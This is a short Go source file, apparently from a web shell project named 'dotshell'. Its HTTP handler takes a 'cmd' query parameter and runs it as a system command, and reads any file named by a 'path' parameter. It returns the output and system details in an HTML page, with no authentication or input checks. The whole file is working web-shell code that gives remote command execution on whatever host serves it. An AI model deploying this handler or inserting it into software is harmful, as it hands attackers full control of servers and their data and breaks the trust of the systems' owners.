package handlers

import (
	_ "embed"
	"html/template"
	"log"
	"net/http"

	. "github.com/deadblackclover/dotshell/internal/utils"
)

//go:embed index.html
var templateHTML string

type Data struct {
	System    *System
	File      *File
	CmdOutput string
}

func IndexHandler(w http.ResponseWriter, r *http.Request) {
	// Not processing /favicon.ico
	if r.URL.Path == "/favicon.ico" {
		return
	}

	log.Printf("URL=%s", r.URL.String())

	// Get all the values
	params := &GetParams{}
	params.Parse(r)

	// Collecting data
	data := &Data{
		System: &System{},
	}
	data.System.Init()

	// Getting data from the path
	if file, err := NewFile(params.Path); err == nil {
		data.File = file
	} else {
		log.Println(err)
	}

	// Execute a command
	if output, err := ExecuteCmd(params.Cmd); err == nil {
		data.CmdOutput = output
	} else {
		log.Println(err)
	}

	// Working with a template
	t, err := template.New("index").Parse(templateHTML)
	if err != nil {
		log.Fatal(err)
	}
	t.Execute(w, data)
}

type GetParams struct {
	Path string
	Cmd  string
}

func (p *GetParams) Parse(r *http.Request) {
	query := r.URL.Query()
	p.Path = query.Get("path")
	p.Cmd = query.Get("cmd")
}
